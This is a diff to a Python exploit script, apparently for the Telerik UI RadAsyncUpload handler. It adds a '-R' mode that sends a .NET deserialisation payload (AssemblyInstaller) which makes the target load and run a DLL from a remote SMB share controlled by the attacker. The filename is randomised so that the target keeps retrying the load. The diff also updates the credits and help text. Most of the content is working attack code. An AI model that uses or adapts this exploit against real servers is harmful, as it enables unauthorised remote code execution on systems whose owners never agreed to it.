@@ -13,9 +13,7 @@
 # versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
 # RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)
 
-# .NET deserialisation was discovered by @mwulftange and mitigated in R3 2019 SP1 by adding whitelisting feature
-
-# Updated exploit works on later versions where custom keys have been set if you
+# This exploit works on later versions where custom keys have been set if you
 # have access to them, e.g. readable web.config
 # not compatible when machine key protect encryption is used
 
@@ -25,12 +23,30 @@
 
 # http://target/Telerik.Web.UI.WebResource.axd?type=rau
 
+# ***
+
+# .NET deserialisation was discovered by @mwulftange and mitigated in R3 2019 SP1 by adding whitelisting feature
+
+# Collaborator/Responder feature added August 2020
+# - requires target to be running IIS App pool with sufficient privileges
+# - requires target to have sufficient outbound smb on firewall and/or dns egress
+# Credit to @rwincey - demonstrating possibility of pulling in remote assemblies
+
+# Credit also to @irsdl who inspired the custom payload feature
+
+# Credit also to @noperator who has produced some great research 
+# and exploit on the .NET deserialisation and mixed mode assemblies
+
+# ****
+
+
 import sys
 import base64
 import json
 import re
 import requests
 import os
+import uuid
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC
 from Crypto.Hash import SHA256
@@ -338,6 +354,16 @@ def mode_send_custom_Payload(proxy = False):
 def mode_send_custom_Payload_proxy(): 
     mode_send_custom_Payload(sys.argv[5])
 
+def mode_send_remote_Payload(proxy = False):
+	print(upload(
+		custom_payload(  # filename is randomised to workaround the caching of failure to load assembly - ensures the target will re-attempt each time
+			'{"Path":"file:////' + sys.argv[2] + '/share/mixed_mode_assembly_' + str(uuid.uuid1()) + '.dll"}', 
+			'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
+		), sys.argv[3], proxy)
+	)
+
+def mode_send_remote_Payload_proxy():
+	mode_send_remote_Payload(sys.argv[4])
 
 def mode_payload():
     # generate a payload based on TempTargetFolder, Version and payload file
@@ -378,9 +404,12 @@ def mode_help():
         "Generate custom payload POST data : -c partA partB\n" +
         "Send custom payload:                -C partA partB url [proxy]\n\n" +
 
-        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n"
-        "Example Version:           2016.2.504\n"
-        "Example optional proxy:    127.0.0.1:8080\n"
+        "Test Responder/Burp Collaborator    -R lhost url [proxy]\n\n" + 
+        #    ;)
+
+        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n" +
+        "Example Version:           2016.2.504\n" +
+        "Example optional proxy:    127.0.0.1:8080\n" +
         "\n" +
         "N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS\n"
     )
@@ -409,6 +438,10 @@ if __name__ == "__main__":
         mode_send_custom_Payload()
     elif sys.argv[1] == "-C" and len(sys.argv) == 6:
         mode_send_custom_Payload_proxy()
+    elif sys.argv[1] == "-R" and len(sys.argv) == 4:
+        mode_send_remote_Payload()
+    elif sys.argv[1] == "-R" and len(sys.argv) == 5:
+        mode_send_remote_Payload_proxy()        
     elif sys.argv[1] == "-p" and len(sys.argv) == 5:
         mode_payload()
     elif sys.argv[1] == "-P" and len(sys.argv) == 6:
@@ -417,3 +450,4 @@ if __name__ == "__main__":
         mode_Post_Proxy()
     else:
         mode_help()
+
